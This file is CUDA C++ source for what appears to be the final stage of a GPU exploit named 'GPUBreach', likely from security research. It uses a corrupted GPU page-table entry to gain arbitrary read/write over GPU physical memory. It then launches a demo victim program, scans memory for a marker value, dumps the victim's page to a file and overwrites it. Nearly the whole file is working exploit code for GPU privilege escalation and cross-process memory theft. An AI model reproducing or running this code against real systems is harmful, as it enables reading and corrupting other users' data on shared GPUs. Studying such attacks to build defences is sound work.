#include "./s4_secondRegion.cuh"
#include <iostream>
#include <fstream>
#include <sys/mman.h>
#include <fcntl.h>
#include <filesystem>
#include <unistd.h>
#include <iomanip>

static void
removeFirstArg (int &argc, char *argv[])
{
  for (int i = 1; i < argc; ++i)
    argv[i - 1] = argv[i];
  argc -= 1;
  argv[argc] = nullptr;
}

void dump_memory(void* ptr, const std::string& filename) {
    std::ofstream ofs(filename);
    if (!ofs) {
        std::cerr << "Failed to open file\n";
        return;
    }

    uint64_t* p = reinterpret_cast<uint64_t*>(ptr);
    size_t num_rows = (2 * 1024 * 1024) / 8;  // 2MB / 8 bytes

    for (size_t i = 0; i < num_rows; i++) {
        ofs << std::hex << std::setw(16) << std::setfill('0')
            << reinterpret_cast<uintptr_t>(&p[i]) << " "
            << std::setw(16) << p[i] << "\n";
    }
}

int
main (int argc, char *argv[])
{
  if (argc <= 1)
  {
    std::cout << "Not enough arguments.\n";
    return 0;
  }

  removeFirstArg (argc, argv);
  GPUBreachContext ctx = second_PT_region (argc, argv);
  std::cout << "GPU Privilege Escalation Finished, proceeding to setting up environment for dumping user memory..."<< '\n';

  auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
  
  char * flush_ptr;
  uint8_t *data_device_ptr;
  uint64_t flush_size = 3L * 1024 * 1024 * 1024;
  cudaMallocManaged(&flush_ptr, flush_size);
  cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);

  initialize_memory_loop<<<1,1>>>((uint8_t*)flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  // Generate 64KB Pages
  gen_64KB(flush_ptr, flush_size);

  // Flush
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  uint64_t arb_rw_ofs;
  
  uint64_t initial_offset_1 = 0;
  uint64_t initial_offset_2 = 0;

  void* arb_rw_orig_ptr = nullptr;
  void* arb_rw_ptr = nullptr;
  void* pt_rw_orig_ptr = nullptr;

  const uint64_t null_pte =(uint64_t)(0x0600000000000001);
  const uint64_t mask_2MB_pte =        0xFF000000000FFFFULL;
  cudaMemcpyArray(data_device_ptr, corrupted_ptr, 64L * 1024);
  // paused();

  for (uint64_t z = 0; z < 64L * 1024; z+=16)
    {
      DBG_OUT << (void*)z << ' ' << *(void**)(data_device_ptr + z) << ' ' << (void*)((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) << '\n';
      if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) == null_pte && arb_rw_orig_ptr == nullptr)
      {
        arb_rw_orig_ptr = *(void**)(data_device_ptr + z);
        initial_offset_1 = z;
        DBG_OUT << "Found " << arb_rw_orig_ptr << '\n';
      }
      else if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) != (null_pte) && arb_rw_orig_ptr != nullptr)
      {
        arb_rw_orig_ptr = nullptr;
        initial_offset_1 = 0;
      }
      else if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) == (null_pte))
      {
        pt_rw_orig_ptr = *(void**)(data_device_ptr + z);
        initial_offset_2 = z;
        DBG_OUT << "Found" << arb_rw_orig_ptr <<'\n';
        break;
      }
      
    }

    if (debug_enabled())
    {
      std::cout << "Done \n";
      paused();
    }

  memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, (uint64_t)(0x60000000000001), 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());
  
  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    DBG_OUT << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << '\n';
    if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      DBG_OUT << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n' << std::flush;
      arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
      arb_rw_ofs = j;
      break;
    }
    gpuErrchk(cudaPeekAtLastError());
  }

  uint64_t it_ptr = (uint64_t)(0x600000000000001);
  uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + initial_offset_1) % (2L * 1024 * 1024);
  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
      { 
        memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();
        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr + target_pte_ofs, 8);
        // cudaMemcpy(&value_of_pointer, (uint8_t*)arb_rw_ptr + ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024), 8, cudaMemcpyDeviceToHost);
        DBG_OUT << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        if (*(void**)data_device_ptr == (void*)it_ptr)
        {
          DBG_OUT << *(void**)data_device_ptr << '\n';
          break;
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());

        
      }
      it_ptr += 0x20000;
    }
  uint64_t pt_entry_phys = it_ptr;
  void* pt_rw_ptr = nullptr;
  uint64_t pt_rw_ofs;

  // Set another cudaMalloc to this:
  memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_2, pt_entry_phys, 8);
  cudaDeviceSynchronize();
  simple_flush<<<1,1>>>(flush_ptr, flush_size);
  cudaDeviceSynchronize();

  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
  {
    cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
    if ((void *)cudaMalloced_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
    {
      std::cout << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
      pt_rw_ptr = (void *)cudaMalloced_ptrs[j];
      pt_rw_ofs = j;
      break;
    }
  }


  cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
  DBG_OUT << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
  cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
  DBG_OUT << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';

  std::cout << "(Stable Primitive Ready) Starting another program"
              << '\n';
  std::system("nohup ./data_scripts/gpubreach_demo/app > ./results/gpubreach_demo/app_out.out 2>&1 &");
  
  
  it_ptr = (uint64_t)(0x600000000000001);
  void* target = 0;
  for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
    {
      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
      {
        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
        cudaDeviceSynchronize();
        gen_64KB(flush_ptr, flush_size);
        simple_flush<<<1,1>>>(flush_ptr, flush_size);
        cudaDeviceSynchronize();

        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
        DBG_OUT << i << ' '<< (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
        if (*(void**)(data_device_ptr) == (void*)0xdeadbeefabcdabcd)
        {
          target = (void*)it_ptr;
            std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0xdeadbeefabcdabcd << '\n';
          dump_memory(data_device_ptr, "results/gpubreach_demo/memdump.txt");
          std::cout << "Finished Dumping page, writing to physical location of appto terminate."<< '\n';

          memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr, (uint64_t)0, 2L * 1024 * 1024);
          cudaDeviceSynchronize();
          simple_flush<<<1,1>>>(flush_ptr, flush_size);
          cudaDeviceSynchronize();
          break;
        }

        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());   
      }
      it_ptr += 0x20000;
    }

  cudaFree(flush_ptr);
  cudaFree(data_device_ptr);
  cudaFree(corrupted_ptr);
  for (auto& ptr : cudaMalloced_ptrs)
    cudaFree(ptr);
  
  return 0;
}